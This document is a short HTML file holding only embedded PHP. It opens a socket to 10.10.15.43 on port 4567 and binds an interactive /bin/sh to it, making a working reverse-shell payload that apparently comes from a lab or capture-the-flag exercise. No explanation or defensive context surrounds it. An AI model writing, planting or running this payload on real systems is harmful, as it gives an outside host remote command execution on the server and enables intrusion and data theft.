<html>
    <?php
    $sock=fsockopen("10.10.15.43",4567);
    $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
    ?>
</html>